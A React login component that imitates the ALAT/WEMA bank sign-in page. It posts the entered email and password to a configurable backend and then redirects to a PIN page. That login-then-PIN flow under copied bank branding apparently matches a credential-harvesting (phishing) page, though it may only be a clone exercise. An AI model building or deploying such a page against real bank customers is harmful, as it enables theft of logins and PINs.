import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";

const schema = yup.object().shape({
  email: yup.string().email("Invalid email").required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="ALAT Logo" />
          </div>
          <h2 className="hometitle">Welcome Back!</h2>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="email">Email Address</label>
              <div className="formInput">
                <input
                  name="email"
                  type="email"
                  placeholder="Email Address"
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />

              <label htmlFor="password">Password</label>
              <div className="formInput passwordInput">
                <input
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  {...register("password")}
                />
                <span className=" eyeIcon" onClick={togglePassword}>
                  {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
                </span>
              </div>
              <FormErrMsg errors={errors} inputName="password" />

              <div className="forgotPassword">
                <a href="/forgot-password" className="forgot">
                  Forgot Password?
                </a>
              </div>

              <button type="submit" disabled={loading} className="loginBtn">
                {loading ? "Loading..." : "Log In"}
              </button>
            </form>
          </div>
        </div>
        <div className="signupInfo">
          <p className="infoP">
            Unable to log in? Kindly{" "}
            <a href="/signup" className="signUp">
              Sign Up
            </a>{" "}
            if:
          </p>
          <ul>
            <li>- You are new to WEMA and ALAT.</li>
            <li>- You are new to ALAT and have a WEMA account.</li>
            <li>- You are new to ALAT and have WEMA Mobile.</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default Home;
